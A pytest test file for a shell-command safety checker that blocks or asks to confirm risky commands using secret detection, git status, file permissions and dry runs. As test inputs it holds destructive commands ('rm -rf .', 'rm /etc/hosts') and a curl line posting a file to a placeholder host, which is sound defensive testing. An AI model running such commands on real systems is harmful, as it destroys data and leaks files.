import os
import subprocess

import pytest

from vishell.analyzer import analyze
from vishell.envcheck import assess
from vishell.policy import decide

pytest.importorskip("detect_secrets")
posix = pytest.mark.skipif(os.name != "posix", reason="uid/mode bits need POSIX")


def const(cmd):
    return lambda _req: cmd


@pytest.fixture
def ws(tmp_path):
    def git(*a):
        subprocess.run(["git", "-C", str(tmp_path), *a], check=True, capture_output=True)
    git("init", "-q")
    (tmp_path / "notes.txt").write_text("hello\n")
    (tmp_path / "psswrd").write_text("password=Tr0ub4dor3xq\n")  # meaningless name, real secret
    (tmp_path / "q7x").write_text("plain text\n")
    (tmp_path / ".gitignore").write_text("q7x\n")
    git("add", "notes.txt", ".gitignore")
    git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "init")
    return tmp_path


def test_secret_blocks_regardless_of_name(ws):
    for cmd in ("rm psswrd", "echo x > psswrd", "sed -i s/a/b/ psswrd", "rm -rf ."):
        assert decide("r", const(cmd), root=str(ws)).decision == "block", cmd
    assert assess("cat psswrd", analyze("cat psswrd"), str(ws)).block is False  # reading is not touching


def test_path_rules_alone_let_it_run(ws):
    assert decide("r", const("rm psswrd")).decision == "run"


def test_git_and_snapshot(ws):
    a = analyze("rm q7x")  # caution by path rules; ignored by git
    assert assess("rm q7x", a, str(ws), snapshot=False).risk == "dangerous"
    assert assess("rm q7x", a, str(ws), snapshot=True).risk == "caution"
    assert assess("rm notes.txt", analyze("rm notes.txt"), str(ws), snapshot=True).risk == "safe"
    assert decide("r", const("rm q7x"), root=str(ws), snapshot=False).decision == "confirm"


def test_snapshot_never_lowers_outside_or_network(ws):
    for cmd in ("rm /etc/hosts", "curl -X POST -d @notes.txt http://x"):
        assert decide("r", const(cmd), root=str(ws)).decision == "confirm", cmd


@posix
def test_private_mode_raises_to_dangerous(ws):
    os.chmod(ws / "notes.txt", 0o600)
    assert decide("r", const("rm notes.txt"), root=str(ws)).decision == "confirm"
    os.chmod(ws / "notes.txt", 0o444)  # not writable by you
    assert assess("rm notes.txt", analyze("rm notes.txt"), str(ws)).risk == "dangerous"


class FakeBackend:
    def __init__(self, changed):
        self.changed = changed

    def run(self, payload):
        assert payload["archive"]
        return {"changed": self.changed}


def test_dry_run_bulk_confirms_and_replaces_static_expansion(ws):
    many = FakeBackend([f"gen/{i}.o" for i in range(30)])
    assert decide("r", const("rm -f *.o"), root=str(ws), backend=many).decision == "confirm"
    r = decide("r", const("rm notes.txt"), root=str(ws), backend=many)
    assert r.decision == "confirm" and r.env.n_changed == 30
    # `rm -rf .` statically covers psswrd; the dry run says only notes.txt changed -> no secret
    r = decide("r", const("rm -rf ."), root=str(ws), backend=FakeBackend(["notes.txt"]))
    assert r.decision == "run" and not r.env.block


def test_real_dry_run_counts_changed_files(ws):
    from vishell.sandbox.backends import LocalBackend
    try:
        b = LocalBackend()
    except RuntimeError:
        pytest.skip("needs unshare -rn")
    r = assess("rm notes.txt q7x && touch new", analyze("rm notes.txt q7x && touch new"), str(ws), backend=b)
    assert r.n_changed == 3 and not r.block
